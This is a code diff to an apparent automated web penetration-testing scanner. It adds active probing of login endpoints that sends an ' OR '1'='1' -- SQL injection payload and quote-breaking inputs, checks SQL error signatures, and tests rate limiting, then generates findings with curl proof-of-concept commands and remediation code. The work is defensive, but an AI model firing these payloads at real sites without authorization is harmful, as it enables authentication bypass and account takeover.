@@ -187,6 +187,175 @@ export function extractEndpointsFromHtml(html, baseUrlStr) {
 }
 
 /**
+ * Intercepts login form parameters, fuzzes SQLi/auth payloads, and analyzes server responses.
+ * Implements the Burp Suite Request Interception & Intruder testing methodology.
+ */
+export async function fuzzLoginSecurity(baseUrl, loginPath, formHtml = '') {
+  const diagnosis = {
+    fields: ['email', 'password'],
+    hasCsrf: false,
+    rateLimitDetected: false,
+    fuzzResult: 'SECURE', // 'BYPASS_DETECTED' | 'SQL_ERROR_LEAK' | 'SECURE'
+    bypassEvidence: null,
+    sqlErrorEvidence: null,
+  };
+
+  const targetEndpoint = `${baseUrl}${loginPath}`;
+
+  // 1. Parameter Interception: Extract input field names & anti-CSRF token
+  let userField = 'email';
+  let passField = 'password';
+
+  if (formHtml) {
+    const inputMatches = formHtml.matchAll(/<input[^>]*name=["']([^"']*)["'][^>]*>/gi);
+    const detectedNames = [];
+    for (const m of inputMatches) {
+      const name = m[1].toLowerCase();
+      detectedNames.push(name);
+      if (/(email|username|user|login|account|id)/i.test(name)) userField = m[1];
+      if (/(password|pass|pwd|passwd)/i.test(name)) passField = m[1];
+      if (/(csrf|token|_token|authenticity)/i.test(name)) diagnosis.hasCsrf = true;
+    }
+    if (detectedNames.length > 0) {
+      diagnosis.fields = detectedNames.slice(0, 5);
+    }
+  }
+
+  // 2. Baseline Probe (captures normal failure behavior)
+  let baselineStatus = 401;
+  try {
+    const baseController = new AbortController();
+    const bTimeout = setTimeout(() => baseController.abort(), 4000);
+    const baseRes = await fetch(targetEndpoint, {
+      method: 'POST',
+      headers: { 
+        'Content-Type': 'application/json',
+        'User-Agent': 'Strix-Pentest/2.0 (Auth Intercept & Probe)',
+      },
+      body: JSON.stringify({
+        [userField]: 'audit_test_dummy_user@probe.internal',
+        [passField]: 'dummy_invalid_password_123',
+      }),
+      signal: baseController.signal,
+      redirect: 'manual',
+    });
+    clearTimeout(bTimeout);
+    baselineStatus = baseRes.status;
+  } catch {
+    // Continue
+  }
+
+  // 3. Automated Payload Fuzzing (Burp Intruder style): SQL Injection Tautology & Bypass Test
+  try {
+    const sqliController = new AbortController();
+    const sTimeout = setTimeout(() => sqliController.abort(), 4000);
+    const sqliRes = await fetch(targetEndpoint, {
+      method: 'POST',
+      headers: { 
+        'Content-Type': 'application/json',
+        'User-Agent': 'Strix-Pentest/2.0 (Auth Intercept & Probe)',
+      },
+      body: JSON.stringify({
+        [userField]: "' OR '1'='1' --",
+        [passField]: 'any_password',
+      }),
+      signal: sqliController.signal,
+      redirect: 'manual',
+    });
+    clearTimeout(sTimeout);
+
+    const sqliText = await sqliRes.text();
+    const sqliStatus = sqliRes.status;
+    const cookieHeader = sqliRes.headers.get('set-cookie') || '';
+
+    // Bypass Analysis: Status 200 with tokens/cookies or redirecting to dashboard
+    const isSuccessBypass = (sqliStatus >= 200 && sqliStatus < 300) && (
+      (baselineStatus >= 400) ||
+      cookieHeader.toLowerCase().includes('session') ||
+      cookieHeader.toLowerCase().includes('token') ||
+      /("token"|"jwt"|"accessToken"|"success":true)/i.test(sqliText)
+    );
+
+    const isRedirectBypass = (sqliStatus === 302 || sqliStatus === 301) && (
+      (sqliRes.headers.get('location') || '').includes('/dashboard') ||
+      (sqliRes.headers.get('location') || '').includes('/admin')
+    );
+
+    if (isSuccessBypass || isRedirectBypass) {
+      diagnosis.fuzzResult = 'BYPASS_DETECTED';
+      diagnosis.bypassEvidence = `Tautological SQL payload (' OR '1'='1' --) yielded HTTP ${sqliStatus} with authentication credentials or session tokens, whereas normal probe returned HTTP ${baselineStatus}.`;
+    }
+  } catch {
+    // Continue
+  }
+
+  // 4. SQL Error Leakage Probe
+  if (diagnosis.fuzzResult !== 'BYPASS_DETECTED') {
+    try {
+      const errController = new AbortController();
+      const eTimeout = setTimeout(() => errController.abort(), 4000);
+      const errRes = await fetch(targetEndpoint, {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json',
+          'User-Agent': 'Strix-Pentest/2.0 (Auth Intercept & Probe)',
+        },
+        body: JSON.stringify({
+          [userField]: "admin'\"",
+          [passField]: "pass'",
+        }),
+        signal: errController.signal,
+        redirect: 'manual',
+      });
+      clearTimeout(eTimeout);
+      const errText = await errRes.text();
+
+      const sqlErrorPatterns = [
+        /syntax error in SQL/i,
+        /unclosed quotation mark/i,
+        /SQLSTATE\[/i,
+        /mysql_fetch/i,
+        /pg_query/i,
+        /sqlite3\.OperationalError/i,
+        /check the manual that corresponds to your MySQL server/i,
+        /ORA-01756/i,
+      ];
+
+      for (const pattern of sqlErrorPatterns) {
+        if (pattern.test(errText)) {
+          diagnosis.fuzzResult = 'SQL_ERROR_LEAK';
+          diagnosis.sqlErrorEvidence = `Database error signature detected in response: ${errText.slice(0, 160)}...`;
+          break;
+        }
+      }
+    } catch {
+      // Continue
+    }
+  }
+
+  // 5. Rate Limiting Check (Simulating Burp Intruder rapid requests)
+  try {
+    let hitRateLimit = false;
+    for (let i = 0; i < 3; i++) {
+      const rlRes = await fetch(targetEndpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ [userField]: `fuzz_test_${i}@probe.internal`, [passField]: '123456' }),
+      });
+      if (rlRes.status === 429 || rlRes.status === 403) {
+        hitRateLimit = true;
+        break;
+      }
+    }
+    diagnosis.rateLimitDetected = hitRateLimit;
+  } catch {
+    // Continue
+  }
+
+  return diagnosis;
+}
+
+/**
  * Perform active reconnaissance on a live HTTP/HTTPS web target.
  */
 export async function probeWebTarget(targetUrl) {
@@ -419,6 +588,29 @@ export async function probeWebTarget(targetUrl) {
     }
   }
 
+  // 4. Burp-style Request Interception, Intruder Payload Fuzzing, & Auth Bypass Analysis
+  for (const logEndpoint of reconData.loginEndpoints.slice(0, 2)) {
+    try {
+      const fuzzDiagnosis = await fuzzLoginSecurity(baseUrl, logEndpoint.path, htmlBody);
+      Object.assign(logEndpoint, fuzzDiagnosis);
+
+      if (fuzzDiagnosis.fuzzResult === 'BYPASS_DETECTED') {
+        reconData.exposedRisks.push(`CRITICAL: SQL Injection Authentication Bypass confirmed on ${logEndpoint.path}! Server returned success on tautological payload.`);
+      } else if (fuzzDiagnosis.fuzzResult === 'SQL_ERROR_LEAK') {
+        reconData.exposedRisks.push(`SQL Error Leakage: ${logEndpoint.path} returned unhandled database syntax error in response.`);
+      }
+
+      if (!fuzzDiagnosis.rateLimitDetected) {
+        reconData.exposedRisks.push(`Missing Rate Limiting on ${logEndpoint.path}: susceptible to automated password brute-force and Burp Intruder attacks.`);
+      }
+      if (!fuzzDiagnosis.hasCsrf) {
+        reconData.exposedRisks.push(`Missing Anti-CSRF Token: Login form on ${logEndpoint.path} does not declare CSRF protection.`);
+      }
+    } catch {
+      // Continue if fuzzing request fails
+    }
+  }
+
   return reconData;
 }
 
@@ -591,9 +783,9 @@ ${reconData.adminEndpoints?.length > 0
   ? reconData.adminEndpoints.map(a => `  * ${a.path} -> Status ${a.status} (${a.note})`).join('\n')
   : '  * No custom admin portals discovered'}
 
-### DISCOVERED LOGIN & AUTHENTICATION ENDPOINTS:
+### DISCOVERED LOGIN & AUTHENTICATION ENDPOINTS (WITH BURP-STYLE PARAMETER INTERCEPTION & FUZZING):
 ${reconData.loginEndpoints?.length > 0 
-  ? reconData.loginEndpoints.map(l => `  * [${l.method}] ${l.path} -> Status ${l.status} (${l.note})`).join('\n')
+  ? reconData.loginEndpoints.map(l => `  * [${l.method}] ${l.path} -> Status ${l.status} | Intercepted Fields: [${(l.fields || []).join(', ')}] | CSRF: ${l.hasCsrf ? 'PROTECTED' : 'MISSING'} | Rate-Limiting: ${l.rateLimitDetected ? 'ENFORCED' : 'ABSENT (Burp Intruder Vulnerable)'} | SQLi Fuzz Result: ${l.fuzzResult || 'N/A'}`).join('\n')
   : '  * Standard login endpoints'}
 
 - All Probed Security Endpoints:
@@ -1079,6 +1271,93 @@ export function middleware(req) {
   }
 }`,
         references: ['https://cwe.mitre.org/data/definitions/306.html']
+      });
+    }
+
+    // 4. SQL Injection Authentication Bypass on Login Endpoint
+    const sqliBypass = reconData.loginEndpoints.find(l => l.fuzzResult === 'BYPASS_DETECTED');
+    if (sqliBypass && !rawVulns.some(v => v.title.toLowerCase().includes('sql') && v.title.toLowerCase().includes('bypass'))) {
+      rawVulns.unshift({
+        id: `STRIX-SQLI-BYPASS-${Date.now().toString().slice(-4)}`,
+        title: `Critical SQL Injection Authentication Bypass on Login (${sqliBypass.path})`,
+        severity: 'critical',
+        owaspCategory: 'A05:2025 Injection',
+        cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
+        cve: 'N/A',
+        cvss: 9.8,
+        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
+        confidence: 'high',
+        fixEffort: 'low',
+        endpoint: sqliBypass.path,
+        method: 'POST',
+        target: `${target}${sqliBypass.path}`,
+        description: `Automated Intruder payload fuzzing against ${sqliBypass.path} revealed that the authentication logic is vulnerable to SQL injection authentication bypass. Submitting a tautological SQL payload yielded HTTP 200 with valid session tokens or granted unauthenticated administrative access.`,
+        evidence: sqliBypass.bypassEvidence || `Server returned HTTP 200 / success on "' OR '1'='1' --" payload.`,
+        impact: 'Full authentication bypass allowing attackers to log in as any user or administrator without credentials, leading to total account takeover.',
+        technicalAnalysis: 'User input from login parameters is directly concatenated into the SQL statement without parameterized queries or prepared statements.',
+        pocDescription: `Send the following POST payload with intercepted parameters to bypass authentication:`,
+        pocScriptCode: `curl -X POST "${target}${sqliBypass.path}" \\
+  -H "Content-Type: application/json" \\
+  -d '{"${(sqliBypass.fields && sqliBypass.fields[0]) || 'email'}": "'\\'' OR '\''1'\''='\''1'\'' --", "password": "dummy_password"}'`,
+        codeLocations: [],
+        remediation: 'Implement parameterized queries (prepared statements) for all database operations. Never concatenate user credentials directly into SQL strings. Use bcrypt/argon2 to verify passwords separately.',
+        remediationPatch: `// Secure prepared statement example:
+const query = 'SELECT id, email, password_hash FROM users WHERE email = $1';
+const result = await db.query(query, [email]);
+if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
+const match = await bcrypt.compare(password, result.rows[0].password_hash);
+if (!match) return res.status(401).json({ error: 'Invalid credentials' });`,
+        references: [
+          'https://owasp.org/Top10/A05_2025-Injection/',
+          'https://cwe.mitre.org/data/definitions/89.html'
+        ]
+      });
+    }
+
+    // 5. Missing Rate Limiting / Susceptible to Burp Intruder Brute-Force
+    const noRateLimit = reconData.loginEndpoints.find(l => !l.rateLimitDetected);
+    if (noRateLimit && !rawVulns.some(v => v.title.toLowerCase().includes('rate limit'))) {
+      rawVulns.push({
+        id: `STRIX-RATELIMIT-${Date.now().toString().slice(-4)}`,
+        title: `Missing Rate Limiting & Brute-Force Protection on Login (${noRateLimit.path})`,
+        severity: 'medium',
+        owaspCategory: 'A07:2025 Authentication Failures',
+        cwe: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
+        cve: 'N/A',
+        cvss: 5.3,
+        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
+        confidence: 'high',
+        fixEffort: 'low',
+        endpoint: noRateLimit.path,
+        method: 'POST',
+        target: `${target}${noRateLimit.path}`,
+        description: `Automated fuzzing simulation confirmed that ${noRateLimit.path} accepts consecutive rapid authentication attempts without triggering HTTP 429 Too Many Requests, IP backoff, or CAPTCHA challenges. This leaves the portal susceptible to automated password fuzzing (e.g. Burp Intruder) and credential stuffing.`,
+        evidence: `Consecutive rapid POST requests returned standard responses with no rate limiting or lockout enforced.`,
+        impact: 'Attackers can automate brute-force dictionary attacks against user passwords without being blocked.',
+        technicalAnalysis: 'Missing rate-limiting middleware or account lockout policy on the authentication endpoint.',
+        pocDescription: `Send multiple rapid requests to confirm lack of throttling:`,
+        pocScriptCode: `for i in {1..5}; do
+  curl -s -X POST "${target}${noRateLimit.path}" \\
+    -H "Content-Type: application/json" \\
+    -d '{"email":"test_'$i'@example.com","password":"dummy"}'
+done`,
+        codeLocations: [],
+        remediation: 'Implement an IP-based and account-based rate limiter (e.g. express-rate-limit or Redis token bucket) limiting login attempts to maximum 5 per minute.',
+        remediationPatch: `// Express rate limiter example:
+import rateLimit from 'express-rate-limit';
+
+const authLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,
+  message: { error: 'Too many login attempts. Please try again later.' },
+  standardHeaders: true,
+});
+
+app.post('${noRateLimit.path}', authLimiter, loginHandler);`,
+        references: [
+          'https://owasp.org/Top10/A07_2025-Authentication_Failures/',
+          'https://cwe.mitre.org/data/definitions/307.html'
+        ]
       });
     }
   }
